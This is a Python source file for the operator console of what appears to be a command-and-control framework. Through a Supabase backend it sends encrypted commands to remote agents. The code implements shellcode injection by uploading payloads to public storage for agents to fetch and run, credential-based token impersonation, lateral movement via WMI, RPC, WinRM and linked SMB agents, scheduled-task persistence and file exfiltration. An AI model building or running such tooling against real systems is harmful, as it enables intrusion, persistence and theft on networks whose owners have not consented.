import time
import itertools
import os
import threading
import shlex
from cryptography.fernet import Fernet
import logging

from .database import supabase, get_public_url
from .download import download_file
from .upload import upload_file
from .ai_summary import generate_summary  # Import the new AI summary module
from .encryption_utils import fetch_agent_info_by_hostname, encrypt_response, decrypt_output
from .help import display_detailed_help, display_help, detailed_help  # Import help functions and detailed_help from help.py

# Spinner for visual feedback
spinner = itertools.cycle(['|', '/', '-', '\\'])

# ANSI escape codes for colors
GREEN = '\033[32m'
RED = '\033[31m'
BLUE = '\033[34m'
PURPLE = '\033[35m'
LIGHT_GREY = '\033[38;5;250m'
YELLOW = '\033[33m'
RESET = '\033[0m'
LIGHT_CYAN = '\033[96m'

# Add a global setting to toggle AI summary
AI_SUMMARY = True

# Function to display detailed help for a specific command
def display_detailed_help(command):
    if command in detailed_help:
        help_info = detailed_help[command]
        print("\nCommand Help:")
        print(f" Description  : {help_info['description']}")
        print(f" Command      : {help_info['command']}")
        print(f" Parameters   : {help_info['parameters']}")
        print(f" Example      : {help_info['example']}\n")
    else:
        print(f"No detailed help available for command: {command}")

def fetch_agent_info_by_hostname(hostname):
    """Fetch the agent_id and encryption key using hostname from the settings table."""
    try:
        response = supabase.table('settings').select('agent_id', 'encryption_key').eq('hostname', hostname).execute()
        if response.data:
            agent_info = response.data[0]
            encryption_key = agent_info.get('encryption_key')
            if (encryption_key):
                encryption_key = encryption_key.encode()
            return agent_info['agent_id'], encryption_key
        else:
            print(f"{RED}Error:{RESET} No agent_id found for hostname: {hostname}")
            return None, None
    except Exception as e:
        print(f"{RED}Error:{RESET} An error occurred while fetching agent info for hostname {hostname}: {e}")
        return None, None

def get_local_user(hostname):
    """Fetch the local user using the hostname from the settings table."""
    try:
        response = supabase.table('settings').select('localuser').eq('hostname', hostname).execute()
        if response.data:
            return response.data[0].get('localuser')
        else:
            print(f"{RED}Error:{RESET} No local user found for hostname: {hostname}")
            return None
    except Exception as e:
        print(f"{RED}Error:{RESET} An error occurred while fetching local user for hostname {hostname}: {e}")
        return None

def decrypt_output(encrypted_output, key):
    try:
        logging.info(f"Decrypting output using key: {key}")
        cipher_suite = Fernet(key)
        decrypted_data = cipher_suite.decrypt(encrypted_output.encode()).decode()
        logging.info(f"Decrypted output: {decrypted_data}")
        return decrypted_data
    except Exception as e:
        logging.error(f"Failed to decrypt output: {e}")
        return f"Failed to decrypt output: {e}"

def encrypt_response(response, key):
    try:
        logging.info(f"Encrypting response using key: {key}")
        cipher_suite = Fernet(key)
        encrypted_data = cipher_suite.encrypt(response.encode()).decode()
        logging.info(f"Encrypted response: {encrypted_data}")
        return encrypted_data
    except Exception as e:
        logging.error(f"Failed to encrypt response: {e}")
        return f"Failed to encrypt response: {e}"

def view_command_history(hostname, search_term=None):
    """Fetch and display the command history for a specific host and its SMB agents, optionally filtering by a search term."""
    try:
        print(f"{GREEN}Fetching command history for hostname: {hostname}{RESET}")
        if search_term:
            print(f"Filtering with search term: {search_term}")

        # Fetch all command history
        response = supabase.table('py2').select(
            'created_at', 'hostname', 'username', 'ip', 'command', 'output', 'smbhost', 'ai_summary'
        ).or_(
            f"hostname.eq.{hostname},smbhost.eq.{hostname}"
        ).execute()

        # Check for response data
        commands = response.data
        if not commands:
            print(f"\n{YELLOW}No command history available for {hostname}.{RESET}")
            return

        # Fetch encryption key for decryption
        _, encryption_key = fetch_agent_info_by_hostname(hostname)

        # Decrypt the output if encryption key is available
        for command in commands:
            if encryption_key:
                try:
                    command['output'] = decrypt_output(command['output'], encryption_key)
                    command['command'] = decrypt_output(command['command'], encryption_key)
                    if command['ai_summary']:
                        command['ai_summary'] = decrypt_output(command['ai_summary'], encryption_key)
                except Exception as e:
                    print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")

        # Filter commands locally if search_term is provided
        if search_term:
            commands = [cmd for cmd in commands if search_term.lower() in (cmd.get('output', '')).lower()]

        if not commands:
            print(f"\n{YELLOW}No matches found for the search term '{search_term}' in command history for {hostname}.{RESET}")
            return

        print(f"\n{GREEN}Command History for {hostname}:{RESET}")

        for command in commands:
            created_at = command['created_at']
            username = command['username']
            ip = command.get('ip', 'N/A')
            cmd = command['command']
            output = command['output']
            ai_summary = command.get('ai_summary', 'No summary available')

            # Use smbhost if it exists, otherwise use hostname
            if command.get('smbhost'):
                exec_hostname = command['smbhost']
                color = RED  # Set color to red for SMB host
            else:
                exec_hostname = command['hostname']
                color = RESET

            print(f"\n{color}Time:{RESET} {created_at}")
            print(f"{color}User:{RESET} {username}")
            print(f"{color}IP:{RESET} {ip}")
            print(f"{color}Hostname:{RESET} {exec_hostname}")
            print(f"{color}Command:{RESET} {cmd}")
            print(f"{color}Output:{RESET} {output}")
            print(f"{color}AI Summary:{RESET} {ai_summary}")
            print(f"{PURPLE}{'-' * 50}{RESET}")

    except Exception as e:
        print(f"{RED}Error:{RESET} An error occurred while fetching command history: {e}")

def handle_view_history_command(command_text, hostname):
    """Handle the 'view_history' and 'view_history grep' commands."""
    parts = command_text.split(maxsplit=2)
    if len(parts) == 2:
        view_command_history(hostname)
    elif len(parts) == 3 and parts[1] == 'grep':
        search_term = parts[2]
        view_command_history(hostname, search_term)
    else:
        print(f"{RED}Error:{RESET} Invalid view_history command format. Use 'view_history' or 'view_history grep <search_term>'.")

def file_exists_in_supabase(bucket_name, storage_path):
    folder_path = os.path.dirname(storage_path)
    response = supabase.storage.from_(bucket_name).list(folder_path)
    if isinstance(response, list):
        for file in response:
            if file['name'] == os.path.basename(storage_path):
                return True
    return False

def check_for_completed_commands(command_id, agent_id, encryption_key, printed_flag, smbhost):
    response = supabase.table('py2').select('status', 'command', 'output').eq('id', command_id).execute()
    command_info = response.data[0]
    if command_info['status'] in ('Completed', 'Failed'):
        if not printed_flag.is_set():
            output = command_info.get('output', 'No output available')
            cmd = command_info.get('command', 'No command available')

            # Decrypt the output if encryption key is available
            if encryption_key:
                try:
                    output = decrypt_output(output, encryption_key)
                except Exception as e:
                    print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")
                    output = "Failed to decrypt output."

            display_hostname = smbhost if smbhost else agent_id
            if command_info['status'] == 'Failed':
                print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
            else:
                print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")

            # Generate AI summary if enabled
            if AI_SUMMARY:
                ai_summary = generate_summary(cmd, output)
                if ai_summary:
                    encrypted_summary = encrypt_response(ai_summary, encryption_key)
                    print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
                    supabase.table('py2').update({'ai_summary': encrypted_summary}).eq('id', command_id).execute()

            printed_flag.set()
        return True
    return False

def background_check(command_id, agent_id, encryption_key, completed_event, printed_flag, smbhost):
    while not completed_event.is_set():
        time.sleep(10)
        if check_for_completed_commands(command_id, agent_id, encryption_key, printed_flag, smbhost):
            completed_event.set()
            break

def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
    linked_smb_ip = None
    smb_hostname = None

    def get_prompt():
        if smb_hostname:
            return f"{LIGHT_GREY}{username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{smb_hostname}{RESET} {RED}smb{RESET}) ~ "
        else:
            return f"{LIGHT_GREY}{username}{RESET} ({LIGHT_CYAN}{local_user}{RESET}@{GREEN}{hostname}{RESET}::{BLUE}{external_ip}{RESET}) ~ "

    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
    print(f"Commands are being issued by user: {username}")

    local_user = get_local_user(hostname)
    if not local_user:
        local_user = 'unknown'

    external_ip = supabase.table("settings").select("external_ip").eq("hostname", hostname).execute().data
    external_ip = external_ip[0].get('external_ip', 'unknown') if external_ip else 'unknown'

    # Fetch the agent_id and encryption key based on hostname
    agent_id, encryption_key = fetch_agent_info_by_hostname(hostname)
    if not agent_id:
        print(f"{RED}Error:{RESET} Unable to find agent_id for hostname {hostname}.")
        return

    while True:
        prompt = get_prompt()
        command_text = input(prompt).strip().lower()

        if not command_text:
            print(f"{RED}Error:{RESET} Invalid command, please enter a command.")
            continue

        # Check if the user requested detailed help
        if command_text.startswith('help '):
            command = command_text.split(' ', 1)[1]
            display_detailed_help(command)
            continue

        if command_text == 'help':
            display_help(command_mappings)
            continue

        if command_text == 'exit':
            print("Returning to the main menu.")
            break

        if command_text == 'kill':
            print(f"Sending kill command to terminate {GREEN}{hostname}{RESET} agent.")
            command_text = "kill"

        if command_text == 'view_history':
            view_command_history(hostname)
            continue

        if command_text.startswith('view_history grep'):
            parts = command_text.split(maxsplit=2)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid search_history command format. Use 'view_history grep <term>'.")
                continue
            search_term = parts[2]
            view_command_history(hostname, search_term)
            continue

        if command_text.startswith("download"):
            try:
                parts = command_text.split(maxsplit=1)
                if len(parts) < 2:
                    print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                    continue
                _, file_path = parts
                if linked_smb_ip:
                    command_text = f"smb download {file_path}"
                else:
                    download_file(agent_id, hostname, file_path, username)  # Pass hostname here
                continue
            except ValueError:
                print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                continue

        if command_text.startswith("cmd"):
            print(f"{RED}Error:{RESET} cmd is passed by default, enter the command you'd want to run after cmd.")
            continue

        if command_text.startswith("inject_memory"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid inject_memory command format. Use 'inject_memory <local_path>'.")
                continue

            local_path = parts[1]
            bucket_name = "files"
            filename = os.path.basename(local_path)
            storage_path = f"shellcode/{filename}"

            try:
                if not file_exists_in_supabase(bucket_name, storage_path):
                    with open(local_path, 'rb') as f:
                        response = supabase.storage.from_(bucket_name).upload(storage_path, f)
                    print(f"File uploaded and available at: {get_public_url(bucket_name, storage_path)}")
                else:
                    print(f"File already exists at: {get_public_url(bucket_name, storage_path)}")

                file_url = get_public_url(bucket_name, storage_path)
                command_text = f"execshellcode {file_url}"
            except Exception as e:
                print(f"{RED}Error:{RESET} {e}")
                continue

        if command_text == 'ps':
            command_text = "ps"

        elif command_text.startswith('ps grep'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid ps grep command format. Use 'ps grep <pattern>'.")
                continue
            _, _, pattern = parts
            command_text = f"ps grep {pattern}"

        elif command_text.startswith('ps term'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid ps term command format. Use 'ps term <processid>'.")
                continue
            _, _, process_id = parts
            if not process_id.isdigit():
                print(f"{RED}Error:{RESET} Invalid ps term command format. Process ID must be a number.")
                continue
            command_text = f"ps term {process_id}"

        elif command_text.startswith("start_scheduled_task"):
            parts = command_text.split(maxsplit=1)
            if len(parts) != 2:
                print(f"{RED}Error:{RESET} Invalid start_scheduled_task command format. Use 'start_scheduled_task <task_name>'.")
                continue
            command_text = f"start_scheduled_task {parts[1]}"

        elif command_text.startswith("mkdir"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid mkdir command format. Use 'mkdir <directory_path>'.")
                continue
            else:
                command_text = f"mkdir {parts[1]}"

        elif command_text.startswith('compress'):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid compress command format. Use 'compress <file_path>'.")
                continue
            else:
                command_text = f"compress {parts[1]}"

        elif command_text.startswith("cat"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid cat command format. Use 'cat <file_path>'.")
                continue
            else:
                command_text = f"cat {parts[1]}"

        elif command_text.startswith("make_token"):
            parts = command_text.split(maxsplit=3)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid make_token command format. Use 'make_token <username> <password> [domain]'.")
                continue
            username = parts[1]
            password = parts[2]
            domain = parts[3] if len(parts) == 4 else ''
            command_text = f"make_token {username} {password} {domain}"

        elif command_text == "revert_to_self":
            command_text = "revert_to_self"

        elif command_text.startswith("cd"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid cd command format. Use 'cd <directory_path>'.")
                continue
            else:
                command_text = f"cd {parts[1]}"

        elif command_text.startswith("injectshellcode"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid injectshellcode command format. Use 'injectshellcode <file_path>'.")
                continue
            else:
                command_text = f"injectshellcode {parts[1]}"

        elif command_text.startswith("rm"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid rm command format. Use 'rm <path>'.")
                continue
            else:
                command_text = f"rm {parts[1]}"

        elif command_text.startswith("cp"):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid cp command format. Use 'cp <source> <destination>'.")
                continue
            else:
                command_text = f"cp {parts[1]} {parts[2]}"

        elif command_text.startswith("mv"):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid mv command format. Use 'mv <source> <destination>'.")
                continue
            else:
                command_text = f"mv {parts[1]} {parts[2]}"

        elif command_text.startswith("ls"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                command_text = "ls ."
            else:
                command_text = f"ls {parts[1]}"

        elif command_text == "whoami":
            command_text = "whoami"

        elif command_text.startswith("run"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid run command format. Use 'run <path_to_remote_file>'.")
                continue
            else:
                command_text = f"run {parts[1]}"

        elif command_text.startswith("users"):
            parts = command_text.split(' ', 2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid users command format. Use 'users <local|dom> <group_name>'.")
                continue
            group_type, group_name = parts[1], parts[2]
            command_text = f"users {group_type} {group_name}"

        elif command_text.startswith("get_user_info"):
            parts = command_text.split(' ', 2)
            if len(parts) < 2:
                print(f"{RED}Error:{RESET} Invalid get_user_info command format. Use 'get_user_info <username> [domain]'.")
                continue
            username = parts[1]
            domain = parts[2] if len(parts) > 2 else None
            command_text = f"get_user_info {username} {domain if domain else ''}"

        elif command_text.startswith("getsmb"):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid getsmb command format. Use 'getsmb <remote_file_path> <local_file_path> [username password domain]'.")
                continue
            remote_file_path = parts[1]
            local_file_path = parts[2]
            if len(parts) == 6:
                username, password, domain = parts[3], parts[4], parts[5]
                command_text = f"getsmb {remote_file_path} {local_file_path} {username} {password} {domain}"
            else:
                command_text = f"getsmb {remote_file_path} {local_file_path}"

        elif command_text.startswith("writesmb"):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid writesmb command format. Use 'writesmb <local_file_path> <remote_smb_path> [username password domain]'.")
                continue
            local_file_path = parts[1]
            remote_smb_path = parts[2]
            if len(parts) == 6:
                username, password, domain = parts[3], parts[4], parts[5]
                command_text = f"writesmb {local_file_path} {remote_smb_path} {username} {password} {domain}"
            else:
                command_text = f"writesmb {local_file_path} {remote_smb_path}"

        elif command_text.startswith("winrmexec "):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue
            remote_host = parts[1]
            command = parts[2]
            if len(parts) == 6:
                username, password, domain = parts[3], parts[4], parts[5]
                command_text = f"winrmexec {remote_host} {command} {username} {password} {domain}"
            else:
                command_text = f"winrmexec {remote_host} {command}"

        elif command_text.startswith("wmirun"):
            parts = command_text.split(maxsplit=5)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid wmirun command format. Use 'wmirun <hostname> <command> [user password domain]'.")
                continue

            remote_hostname = parts[1]
            command = parts[2]
            user = parts[3] if len(parts) > 3 else ''
            password = parts[4] if len(parts) > 4 else ''
            domain = parts[5] if len(parts) > 5 else ''

            if user and password:
                command_text = f"wmirun {remote_hostname} {command} {user} {password} {domain}"
            else:
                command_text = f"wmirun {remote_hostname} {command}"

        elif command_text.startswith("rpcrun"):
            parts = command_text.split(maxsplit=5)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid rpcrun command format. Use 'rpcrun <hostname> <command> [user password domain]'.")
                continue

            remote_hostname = parts[1]
            command = parts[2]
            user = parts[3] if len(parts) > 3 else ''
            password = parts[4] if len(parts) > 4 else ''
            domain = parts[5] if len(parts) > 5 else ''
            
            if domain:
                user = f"{domain}\\{user}"
            
            # Only include user and password if they are provided
            if user and password:
                command_text = f"rpcrun {remote_hostname} {command} {user} {password}"
            else:
                command_text = f"rpcrun {remote_hostname} {command}"

        elif command_text.startswith("netexec"):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid netexec command format. Use 'netexec <local_file> <arguments>'. Refer to the help section by typing 'help'.")
                continue

            _, local_file, arguments = parts

            bucket_name = "files"
            filename = os.path.basename(local_file)
            storage_path = f"netexec/{filename}"

            try:
                if not file_exists_in_supabase(bucket_name, storage_path):
                    with open(local_file, 'rb') as f:
                        response = supabase.storage.from_(bucket_name).upload(storage_path, f)
                    print(f"File uploaded and available at: {get_public_url(bucket_name, storage_path)}")
                else:
                    print(f"File already exists at: {get_public_url(bucket_name, storage_path)}")

                file_url = get_public_url(bucket_name, storage_path)
                command_text = f"netexec {file_url} {arguments}"
            except Exception as e:
                print(f"{RED}Error:{RESET} {e}")
                continue

        elif command_text.startswith("link smb agent"):
            parts = command_text.split(maxsplit=6)
            if len(parts) < 4 or len(parts) > 7:
                print(f"{RED}Error:{RESET} Invalid link smb agent command format. Use 'link smb agent <ip_address> [username password domain]'.")
                continue
            linked_smb_ip = parts[3]
            if len(parts) == 4:
                command_text = f"link smb agent {linked_smb_ip}"
            elif len(parts) == 5:
                username = parts[4]
                command_text = f"link smb agent {linked_smb_ip} {username}"
            elif len(parts) == 6:
                username, password = parts[4], parts[5]
                command_text = f"link smb agent {linked_smb_ip} {username} {password}"
            elif len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"link smb agent {linked_smb_ip} {username} {password} {domain}"

        elif command_text.startswith("unlink smb agent"):
            parts = command_text.split(maxsplit=3)
            if len(parts) != 4:
                print(f"{RED}Error:{RESET} Invalid unlink smb agent command format. Use 'unlink smb agent <ip_address>'.")
                continue
            if linked_smb_ip == parts[3]:
                linked_smb_ip = None
                smb_hostname = None
            command_text = f"unlink smb agent {parts[3]}"

        elif command_text == "hostname":
            command_text = "hostname"

        elif command_text == "get_ad_domain":
            command_text = "get_ad_domain"

        elif command_text == "get_installed_programs":
            command_text = "get_installed_programs"

        elif command_text == "get_drive_info":
            command_text = "get_drive_info"

        elif command_text == "get_logged_on_users":
            command_text = "get_logged_on_users"

        elif command_text.startswith("get_dc_list"):
            command_text = command_text

        elif command_text == "list_scheduled_tasks":
            command_text = "list_scheduled_tasks"

        elif command_text.startswith("delete_scheduled_task"):
            command_text = command_text

        elif command_text.startswith("get_scheduled_task_info"):
            command_text = command_text

        elif command_text.startswith("nslookup"):
            parts = command_text.split(maxsplit=1)
            if len(parts) < 2:
                print(f"{RED}Error:{RESET} Invalid nslookup command format. Use 'nslookup <hostname>'.")
                continue
            _, host_to_lookup = parts
            command_text = f"nslookup {host_to_lookup}"

        if command_text.lower().startswith("create_scheduled_task"):
            parts = shlex.split(command_text, posix=False)
            if len(parts) < 4 or len(parts) > 6:
                print(f"{RED}Error:{RESET} Invalid command format. Use 'create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration]'.")
                continue

            task_name = parts[1]
            command_line = parts[2].strip('"')
            trigger_time = parts[3]
            repeat_interval = parts[4] if len(parts) >= 5 else None
            repeat_duration = parts[5] if len(parts) == 6 else None

            # Ensure the command line and trigger time are correctly formatted
            if repeat_interval and repeat_duration:
                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time} {repeat_interval} {repeat_duration}'
            elif repeat_interval:
                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time} {repeat_interval}'
            else:
                command_text = f'create_scheduled_task {task_name} "{trigger_time}"'

        if linked_smb_ip and not command_text.startswith("link smb agent") and not command_text.startswith("unlink smb agent"):
            command_text = f"smb {command_text}"

        command_text = command_mappings.get(command_text, command_text)

        if command_text.startswith("winrmexec"):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue

        if command_text == "pwd":
            command_text = "pwd"

        if command_text.startswith('sleep'):
            try:
                _, interval = command_text.split()
                current_sleep_interval = int(interval)
                print(f"Sleep interval set to {current_sleep_interval} seconds.")

                supabase.table("settings").update({
                    "timeout_interval": current_sleep_interval
                }).eq("hostname", hostname).execute()

                continue
            except (ValueError, IndexError):
                print(f"{RED}Error:{RESET} Invalid sleep command format. Use 'sleep <number>'.")
                continue


        elif command_text.startswith("upload"):
            try:
                _, local_path, remote_path = command_text.split(maxsplit=2)
                if linked_smb_ip:
                    command_text = f"smb upload {local_path} {remote_path}"
                else:
                    upload_file(agent_id, hostname, local_path, remote_path, username)  # Pass hostname here
                continue
            except ValueError:
                print(f"{RED}Error:{RESET} Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                continue

        encrypted_command_text = encrypt_response(command_text, encryption_key)

        result = supabase.table('py2').insert({
            'agent_id': agent_id,
            'hostname': hostname,  # Include hostname in the command record
            'username': username,
            'command': encrypted_command_text,
            'status': 'Pending'
        }).execute()

        if command_text == 'kill':
            print(f"Kill command sent to {hostname}. Shutting down.")
            continue

        command_id = result.data[0]['id']
        print(f"Command '{command_text}' added with ID {command_id}.")
        print("Waiting for the command to complete...", end="", flush=True)

        completed_event = threading.Event()
        printed_flag = threading.Event()
        threading.Thread(target=background_check, args=(command_id, hostname, encryption_key, completed_event, printed_flag, smb_hostname), daemon=True).start()

        first_pass = True
        start_time = time.time()
        timeout_occurred = False
        while True:
            if completed_event.is_set():
                break

            if time.time() - start_time > 60:
                print(f"\n{RED}Error:{RESET} Command timeout. No response from {hostname} for 1 minute.")
                timeout_occurred = True
                break

            if not first_pass:
                for _ in range(10):
                    print(next(spinner), end="\b", flush=True)
                    time.sleep(0.1)
            first_pass = False

            response = supabase.table('py2').select('status', 'command', 'output', 'smbhost').eq('id', command_id).execute()
            command_info = response.data[0]

            if command_info['status'] in ('Completed', 'Failed'):
                completed_event.set()
                if not printed_flag.is_set():
                    smb_hostname = command_info.get('smbhost', smb_hostname)
                    output = command_info.get('output', 'No output available')
                    cmd = command_info.get('command', 'No command available')

                    # Decrypt the output if encryption key is available
                    if encryption_key:
                        try:
                            output = decrypt_output(output, encryption_key)
                            cmd = decrypt_output(cmd, encryption_key)
                        except Exception as e:
                            print(f"{RED}Error:{RESET} Failed to decrypt output: {e}")
                            output = "Failed to decrypt output."

                    display_hostname = smb_hostname if smb_hostname else hostname
                    if command_info['status'] == 'Failed':
                        print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
                    else:
                        print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")

                    # Generate AI summary if enabled
                    if AI_SUMMARY:
                        ai_summary = generate_summary(cmd, output)
                        if ai_summary:
                            encrypted_summary = encrypt_response(ai_summary, encryption_key)
                            print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
                            supabase.table('py2').update({'ai_summary': encrypted_summary}).eq('id', command_id).execute()

                    printed_flag.set()
                break

        if timeout_occurred:
            print(f"Returning to command prompt. You can check for command completion later.")